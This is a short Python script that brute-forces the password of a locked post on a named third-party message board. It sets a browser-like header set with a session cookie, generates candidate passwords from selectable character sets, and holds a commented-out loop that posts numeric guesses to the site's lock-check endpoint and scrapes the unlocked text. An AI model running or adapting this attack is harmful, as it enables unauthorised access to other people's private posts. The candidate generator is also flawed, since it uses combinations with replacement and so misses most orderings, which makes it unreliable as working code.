from typing import cast
import requests
from bs4 import BeautifulSoup
from itertools import combinations_with_replacement
from time import sleep

url = "http://www.diorps.com/hm_board/view.php"

querystring = {"type":"board","code":"hm_board","cate":"qna","page":"2","number":"553","keyfield":"","key":""}

headers = {
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://www.diorps.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Referer": "http://www.diorps.com/hm_board/ck_lock.php?type=board&code=hm_board&cate=qna&page=2&turl=view&number=553&keyfield=&key=",
    "Accept-Language": "en,ko-KR;q=0.9,ko;q=0.8,en-US;q=0.7",
    "Cookie": "PHPSESSID=gcjeb3q28efkef0mmj0j0dr2a0"
}

# type of char
list_number = "01234567890"
list_small_character = "abcdefghijklmnopqrstuvwxyz"
list_large_character = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
list_special_character = "!@#$%^&*()_+[]{}\\|"
print("input type of password!!")
print("0: number, 1: number with small char, 2: number with char, 3: plus special char")
type_of_pass = int(input())
brute_force_char = ""
if type_of_pass == 0: brute_force_char = list_number
elif type_of_pass == 1: brute_force_char = list_number + list_small_character
elif type_of_pass == 2: brute_force_char = list_number + list_small_character + list_large_character
elif type_of_pass == 3: brute_force_char = list_number + list_small_character + list_large_character + list_special_character

# max len of target password
print("input max len of pass")
len_of_pass = int(input())

# make password for every thing
for max_len in range(1, len_of_pass):
    for i in combinations_with_replacement(brute_force_char, max_len + 1):
        print(''.join(i)) # 'abc'
        sleep(0.01)


# for i in range(0, 999999):
#     try:
#         payload = f"mode=zn_ck_lock&passwd={i}"
#         response = requests.request("POST", url, data=payload, headers=headers, params=querystring)
#         print(response.status_code, i)
#         res = BeautifulSoup(response.content, 'lxml')
#         res = res.find('div', { 'id':'bdView' }).get_text()
#         res = res.strip().replace("\n", "")
#         print(res)
#         break
#     except Exception: continue